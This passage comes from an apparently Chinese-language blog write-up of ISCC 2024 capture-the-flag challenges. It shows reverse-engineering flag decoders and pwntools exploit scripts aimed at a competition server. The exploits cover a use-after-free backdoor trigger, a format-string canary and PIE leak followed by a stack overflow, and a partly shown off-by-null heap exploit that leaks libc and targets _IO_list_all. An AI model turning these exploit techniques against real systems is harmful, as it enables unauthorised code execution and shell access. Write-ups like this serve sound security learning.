class="hljs-variable">&amp;v305</span>[65 <span class="hljs-comment">* m + 6512]);</span> ++n )<br>    v305[0x41 <span class="hljs-comment">* m + 6512 + n] ^= a2;</span><br>&#125;<br>for ( ii = 0; ii &lt;= 99; ++ii )<br>&#123;<br>  for ( jj = 0; jj &lt; strle<span class="hljs-meta">n</span>(<span class="hljs-variable">&amp;v305</span>[65 <span class="hljs-comment">* ii]);</span> ++jj )<br>    v305[65 <span class="hljs-comment">* ii + jj] ^= a2;</span><br>&#125;<br></code></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64  <br>byte_list = []  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>):  <br> byte_list.append(<span class="hljs-built_in">chr</span>(get_wide_byte(<span class="hljs-number">0x14000BF40</span> + i) \^ <span class="hljs-number">0xc</span>))  <br>encoded_flag = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;&quot;</span>.join(byte_list))  <br>decoded_flag = base64.b64decode(encoded_flag).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)  <br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ISCC&#123;&#123;<span class="hljs-subst">&#123;decoded_flag&#125;</span>&#125;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure>

<h4 id="Reverse-DLLCode"><a href="#Reverse-DLLCode" class="headerlink" title="Reverse DLLCode"></a>Reverse DLLCode</h4><p>简单异或</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs smali">int __cdecl main(int argc,<span class="hljs-built_in"> const </span>char **argv,<span class="hljs-built_in"> const </span>char **envp)<br>&#123;<br>  char *v4; // eax<br>  _DWORD *v5; // eax<br> <span class="hljs-built_in"> int </span>v6; // eax<br> <span class="hljs-built_in"> int </span>v7; // [esp-4h] [ebp-13Ch]<br> <span class="hljs-built_in"> int </span>v8[24]; // [esp+Ch] [ebp-12Ch] BYREF<br>  char v9[4]; // [esp+6Ch] [ebp-CCh] BYREF<br> <span class="hljs-built_in"> int </span>v10; // [esp+70h] [ebp-C8h]<br>  char v11; // [esp+7Bh] [ebp-BDh] BYREF<br>  unsigned<span class="hljs-built_in"> int </span>i; // [esp+7Ch] [ebp-BCh]<br>  char v13[24]; // [esp+80h] [ebp-B8h] BYREF<br>  char v14[24]; // [esp+98h] [ebp-A0h] BYREF<br>  char v15[24]; // [esp+B0h] [ebp-88h] BYREF<br>  char v16[24]; // [esp+C8h] [ebp-70h] BYREF<br>  char v17[24]; // [esp+E0h] [ebp-58h] BYREF<br>  char v18[24]; // [esp+F8h] [ebp-40h] BYREF<br>  char v19[12]; // [esp+110h] [ebp-28h] BYREF<br>  char v20[12]; // [esp+11Ch] [ebp-1Ch] BYREF<br> <span class="hljs-built_in"> int </span>v21; // [esp+134h] [ebp-4h]<br><br>  sub_401F40(v18);<br>  v21 = 0;<br>  sub_402A40(std::cout, <span class="hljs-string">&quot;Please enter a string of 24 lengthss:&quot;</span>);<br>  sub_402D80(std::cin, v18);<br> <span class="hljs-built_in"> if </span>( unknown_libname_5(v18) == 24 )<br>  &#123;<br>    sub_401F40(v16);<br>    LOBYTE(v21) = 1;<br>    sub_401F40(v17);<br>    LOBYTE(v21) = 2;<br>    for ( i = 0; i &lt; unknown_libname_5(v18); ++i )<br>    &#123;<br>      v4 = (char *)sub_401E70(i);<br>      std::string::operator+=(*v4);<br>    &#125;<br>    Encode(v13, v16);<br>    LOBYTE(v21) = 3;<br>    sub_4014D0(v14, v17);<br>    LOBYTE(v21) = 4;<br>    sub_402DA0(v15, v13, v14);<br>    LOBYTE(v21) = 5;<br>    sub_4016A0(0xCu);<br>    v8[0] = 0;<br>    v8[1] = 16;<br>    v8[2] = 56;<br>    v8[3] = 19;<br>    v8[4] = 10;<br>    v8[5] = 61;<br>    v8[6] = 116;<br>    v8[7] = 43;<br>    v8[8] = 3;<br>    v8[9] = 0;<br>    v8[10] = 20;<br>    v8[11] = 3;<br>    v8[12] = 67;<br>    v8[13] = 89;<br>    v8[14] = 83;<br>    v8[15] = 68;<br>    v8[16] = 70;<br>    v8[17] = 84;<br>    v8[18] = 64;<br>    v8[19] = 103;<br>    v8[20] = 75;<br>    v8[21] = 125;<br>    v8[22] = 117;<br>    v8[23] = 98;<br>    v7 = unknown_libname_4(&amp;v11);<br>    v5 = (_DWORD *)unknown_libname_3(v8, v9);<br>    sub_401D70(*v5, v5[1], v7);<br>    LOBYTE(v21) = 6;<br>    sub_4016A0(0xCu);<br>    sub_4015C0(v20, v15);<br>    LOBYTE(v21) = 7;<br>   <span class="hljs-built_in"> if </span>( (unsigned __int8)sub_4016C0(v20, v19) )<br>      v6 = sub_402A40(std::cout, <span class="hljs-string">&quot;right!&quot;</span>);<br>    else<br>      v6 = sub_402A40(std::cout, <span class="hljs-string">&quot;error!&quot;</span>);<br>    std::ostream::operator&lt;&lt;(v6, sub_402E30);<br>   <span class="hljs-keyword"> system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    v10 = 0;<br>    LOBYTE(v21) = 6;<br>    sub_401CA0(v20);<br>    LOBYTE(v21) = 5;<br>    sub_401CA0(v19);<br>    LOBYTE(v21) = 4;<br>    std::string::~string(v15);<br>    LOBYTE(v21) = 3;<br>    std::string::~string(v14);<br>    LOBYTE(v21) = 2;<br>    std::string::~string(v13);<br>    LOBYTE(v21) = 1;<br>    std::string::~string(v17);<br>    LOBYTE(v21) = 0;<br>    std::string::~string(v16);<br>    v21 = -1;<br>    std::string::~string(v18);<br>   <span class="hljs-built_in"> return </span>v10;<br>  &#125;<br>  else<br>  &#123;<br>    sub_402A40(std::cout, <span class="hljs-string">&quot;The input length is incorrect.\n&quot;</span>);<br>    v21 = -1;<br>    std::string::~string(v18);<br>   <span class="hljs-built_in"> return </span>1;<br>  &#125;<br>&#125;<span class="hljs-built_in"></span><br><span class="hljs-built_in">int </span>__cdecl sub_4014D0(int a1,<span class="hljs-built_in"> int </span>a2)<br>&#123;<br>  _BYTE *v2; // esi<br> <span class="hljs-built_in"> int </span>v4[12]; // [esp+4h] [ebp-54h]<br> <span class="hljs-built_in"> int </span>v5; // [esp+34h] [ebp-24h]<br> <span class="hljs-built_in"> int </span>i; // [esp+38h] [ebp-20h]<br>  char v7[24]; // [esp+3Ch] [ebp-1Ch] BYREF<br><br>  v5 = 0;<br>  v4[0] = 2;<br>  v4[1] = 0;<br>  v4[2] = 3;<br>  v4[3] = 1;<br>  v4[4] = 6;<br>  v4[5] = 4;<br>  v4[6] = 7;<br>  v4[7] = 5;<br>  v4[8] = 10;<br>  v4[9] = 8;<br>  v4[10] = 11;<br>  v4[11] = 9;<br>  sub_401F80(a2);<br>  for ( i = 0; i &lt; 12; ++i )<br>  &#123;<br>    v2 = (_BYTE *)sub_401E70(i);<br>    *(_BYTE *)sub_401E70(v4[i]) = *v2;<br>  &#125;<br>  sub_401EF0(v7);<br>  v5 |= 1u;<br>  std::string::~string(v7);<br> <span class="hljs-built_in"> return </span>a1;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="../../../../img/archives/2024ISCC05/77ffd53676ff878f7b642ef2b3fe629c.png" srcset="/img/loading.gif" lazyload> 程序将将输入的 24 个字符分割成两个数组，对后一个数组进行位置置换，使用 v4 数组作为置换规则。对前一个数组进行异或加密，使用密钥 ISCC。对前一个数组的每个字符，使用 key 的对应字符的 ASCII 码值进行异或运算。最后将两个数组组合成一个新的字符串输出。根据此逻辑进行解密得到 flag</p>
<p><img src="../../../../img/archives/2024ISCC05/67c0962e21a4669b235a40d3136d0178.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">v8 = [<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">56</span>, <span class="hljs-number">19</span>, <span class="hljs-number">10</span>, <span class="hljs-number">61</span>, <span class="hljs-number">116</span>, <span class="hljs-number">43</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">3</span>, <span class="hljs-number">67</span>, <span class="hljs-number">89</span>, <span class="hljs-number">83</span>, <span class="hljs-number">68</span>, <span class="hljs-number">70</span>, <span class="hljs-number">84</span>, <span class="hljs-number">64</span>, <span class="hljs-number">103</span>, <span class="hljs-number">75</span>, <span class="hljs-number">125</span>, <span class="hljs-number">117</span>, <span class="hljs-number">98</span>]  <br>list_1 = v8[:<span class="hljs-number">12</span>]  <br>list_2 = v8[<span class="hljs-number">12</span>:]  <br>v4 = [<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">9</span>]  <br>key = <span class="hljs-string">&#x27;ISCC&#x27;</span>  <br><br>list_1 = [list_1[i] \^ <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(list_1))]  <br>list_2 = [list_2[v4[i]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(list_2))]  <br><br><span class="hljs-keyword">for</span> char1, char2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(list_1, list_2):  <br> <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(char1) + <span class="hljs-built_in">chr</span>(char2), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="pwn-chaos"><a href="#pwn-chaos" class="headerlink" title="pwn chaos"></a>pwn chaos</h4><p>IDA 反编译，分析 main 调用的几个函数，发现存在后门</p>
<table>
<thead>
<tr>
<th><img src="../../../../img/archives/2024ISCC05/e3d995e3a735d028ed9d27823d697427.png" srcset="/img/loading.gif" lazyload></th>
</tr>
</thead>
</table>
<p>函数先 ptr &#x3D; malloc(0x68uLL); free(ptr); 接着程序要求用户输入一个堆块大小 v1，并根据这个大小分配内存给 v3。</p>
<p>程序要求用户输入内容到 v3。如果 ptr 指向的内容前四个字节是 “Flag”，则执行 system(“&#x2F;bin&#x2F;sh”)。由于 ptr 已经被释放，则可以利用这个 UAF（Use-After-Free）漏洞将 ptr 重新指向一个新的内存区域，并填入 “Flag”，从而触发后门。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_until</span>(<span class="hljs-params">prompt, data</span>):<br>    receive_until(prompt)<br>    send_line(data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">receive_until</span>(<span class="hljs-params">prompt</span>):<br>    <span class="hljs-keyword">return</span> io.recvuntil(prompt)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_line</span>(<span class="hljs-params">data</span>):<br>    io.sendline(data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">interact</span>():<br>    io.interactive()<br><br>io = remote(<span class="hljs-string">&#x27;182.92.237.102&#x27;</span>, <span class="hljs-number">10010</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./chaos&#x27;</span>)<br>send_until(<span class="hljs-string">&quot;Please Choice:&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))<br>send_until(<span class="hljs-string">&quot;Please Input Chunk size :&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x68</span>))<br>send_until(<span class="hljs-string">&quot;Please Input Content : &quot;</span>, <span class="hljs-string">b&#x27;Flag\x00&#x27;</span>)<br>interact()<br></code></pre></td></tr></table></figure>

<h4 id="pwn-easyshell"><a href="#pwn-easyshell" class="headerlink" title="pwn easyshell"></a>pwn easyshell</h4><p><img src="../../../../img/archives/2024ISCC05/5b01032d516acdc21a907d2c3b2ae64f.png" srcset="/img/loading.gif" lazyload> IDA 反编译看 core_code</p>
<p><img src="../../../../img/archives/2024ISCC05/083cfc05866e7d45eed38cc00458290c.png" srcset="/img/loading.gif" lazyload> 发现程序存在一个后门函数 flagis，当输入以 flagis 开头时，会将输入的剩余部分作为格式化字符串参数传递给 printf 函数。printf(&amp;s1 [7])存在格式化字符串漏洞，可以泄露内存信息。程序开了 Canary 和 PIE 保护，需要绕过才能进行栈溢出。据此编写 exp 得到 flag。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&quot;182.92.237.102&quot;</span>, <span class="hljs-string">&quot;10011&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>)<br><br>pld1 = <span class="hljs-string">b&#x27;flagis\x00&#x27;</span> + <span class="hljs-string">b&#x27;%15$p&#x27;</span><br>io.sendline(pld1)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>cnry = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>)<br><br>pld2 = <span class="hljs-string">b&#x27;flagis\x00&#x27;</span> + <span class="hljs-string">b&#x27;%17$p&#x27;</span><br>io.sendline(pld2)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>pie = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x1520</span><br><br>bdoor = pie + <span class="hljs-number">0x128E</span><br>pld3 = <span class="hljs-string">b&#x27;exit\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x33</span> + p64(cnry) + p64(<span class="hljs-number">0</span>) + p64(bdoor)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>)<br>io.sendline(pld3)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<h4 id="pwn-eazy-heap"><a href="#pwn-eazy-heap" class="headerlink" title="pwn eazy_heap"></a>pwn eazy_heap</h4><p><img src="../../../../img/archives/2024ISCC05/fabc017782a86fba46a94288f2591965.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/ddd614b5d5cc09ee4e7d5b7f9ac01142.png" srcset="/img/loading.gif" lazyload> IDA 反编译进行分析</p>
<p><img src="../../../../img/archives/2024ISCC05/142f4983b114596336e412db0afdf183.png" srcset="/img/loading.gif" lazyload> 漏洞位于 edit 函数中的 off-by-null 漏洞。edit 函数中读取输入内容到指定的内存块中，然后在读取到的数据后面加一个 0 字节。这会导致溢出并破坏后面的内存。通过多次添加和删除操作，形成特定的堆布局，可以利用编辑操作中的 off-by-null 漏洞，精确覆盖堆管理结构。通过正常的程序执行流，触发覆盖后的控制数据，实现任意代码执行。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_chunk</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;input your car choice &gt;&gt; \n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;size:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;content:\n&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_chunk</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;input your car choice &gt;&gt; \n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;idx:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">modify_chunk</span>(<span class="hljs-params">index, content</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;input your car choice &gt;&gt; \n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;idx:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">&quot;content:\n&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">display_chunk</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;input your car choice &gt;&gt; \n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;idx:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br>p = remote(<span class="hljs-string">&#x27;182.92.237.102&#x27;</span>, <span class="hljs-number">2122</span>)<br><br>create_chunk(<span class="hljs-number">0x410</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>create_chunk(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>create_chunk(<span class="hljs-number">0x430</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>create_chunk(<span class="hljs-number">0x430</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>create_chunk(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>create_chunk(<span class="hljs-number">0x480</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>create_chunk(<span class="hljs-number">0x420</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>create_chunk(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>remove_chunk(<span class="hljs-number">0</span>)<br>remove_chunk(<span class="hljs-number">3</span>)<br>remove_chunk(<span class="hljs-number">6</span>)<br>remove_chunk(<span class="hljs-number">2</span>)<br><br>create_chunk(<span class="hljs-number">0x450</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x438</span> + p32(<span class="hljs-number">0x551</span>))<br>create_chunk(<span class="hljs-number">0x410</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>create_chunk(<span class="hljs-number">0x420</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>create_chunk(<span class="hljs-number">0x410</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>remove_chunk(<span class="hljs-number">6</span>)<br>remove_chunk(<span class="hljs-number">2</span>)<br><br>create_chunk(<span class="hljs-number">0x410</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>create_chunk(<span class="hljs-number">0x410</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>modify_chunk(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br><br>remove_chunk(<span class="hljs-number">6</span>)<br>remove_chunk(<span class="hljs-number">3</span>)<br>remove_chunk(<span class="hljs-number">5</span>)<br><br>create_chunk(<span class="hljs-number">0x4f0</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x488</span> + p64(<span class="hljs-number">0x431</span>))<br>create_chunk(<span class="hljs-number">0x3b0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>modify_chunk(<span class="hljs-number">3</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x488</span> + p64(<span class="hljs-number">0x431</span>))<br>remove_chunk(<span class="hljs-number">4</span>)<br><br>create_chunk(<span class="hljs-number">0x108</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x100</span>)<br>modify_chunk(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0x550</span>))<br>create_chunk(<span class="hljs-number">0x410</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>remove_chunk(<span class="hljs-number">3</span>)<br>display_chunk(<span class="hljs-number">6</span>)<br><br>libc_base = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21a000</span><br>io_list_all = libc_base + <span class="hljs-number">0x21a680</span><br>setcontext = libc_base + <span class="hljs-number">0x53a30</span> + <span class="hljs-number">61</span><br>prdi_ret = libc_base + <span class="hljs-number">0x2a3e5</span><br>prsi_ret = libc_base + <span class="hljs-number">0x2be51</span><br>prdx_r12_ret = libc_base + <span class="hljs-number">0x11f497</span><br>open_addr = libc_base + <span class="hljs-number">0x114690</span><br>read_addr = libc_base + <span class="hljs-number">0x114980</span><br>write_addr = libc_base + <span class="hljs-number">0x114a20</span><br><br>p.recv(<span class="hljs-number">2</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0xc20</span><br><br>create_chunk(<span class="hljs-number">0x3f0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>create_chunk(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0xa1</span>))<br>remove_chunk(<span class="hljs-number">7</span>)<br>remove_chunk(<span class="hljs-number">4</span>)<br>modify_chunk(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0xa1</span>) + p64(io_list_all ^ ((heap_base &gt;&gt; <span class="hljs-number">12</span>) + <span 